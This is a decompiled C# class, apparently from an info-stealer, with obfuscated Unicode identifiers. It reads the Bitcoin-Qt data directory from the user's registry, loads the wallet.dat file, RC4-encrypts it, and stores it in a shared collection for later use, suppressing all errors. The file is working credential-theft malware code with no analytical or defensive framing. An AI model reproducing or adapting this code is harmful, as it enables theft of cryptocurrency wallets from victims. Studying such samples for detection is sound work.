using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200001E RID: 30
	internal class Class_20
	{
		// Token: 0x0600006A RID: 106 RVA: 0x00004D00 File Offset: 0x00002F00
		public static void dmethod_46(string str_0)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						Dictionary<string, byte[]> u0347_u0020_u0328_u0020_u0369_u0E47h_u0364_u0358_u036D_u036B_u0324_u0322_u0E47_u031F_u0369qhgddlayjusqyuib_u0353c_u0347_u036Dr_u0020_u0E47_u0356_u0356_u0332_u036D_u0347_u0325_u030E_u0E47_u0356gugwsaxccacjclln = Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln;
						string key = str_0 + "\\BitcoinCore\\wallet.dat";
						object value = registryKey.GetValue("strDataDir");
						u0347_u0020_u0328_u0020_u0369_u0E47h_u0364_u0358_u036D_u036B_u0324_u0322_u0E47_u031F_u0369qhgddlayjusqyuib_u0353c_u0347_u036Dr_u0020_u0E47_u0356_u0356_u0332_u036D_u0347_u0325_u030E_u0E47_u0356gugwsaxccacjclln.Add(key, Class_47.RC4(File.ReadAllBytes(((value != null) ? value.ToString() : null) + "\\wallet.dat")));
						Class_20.field_0++;
						Class_54.field_0++;
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400004E RID: 78
		public static int field_0;
	}
}
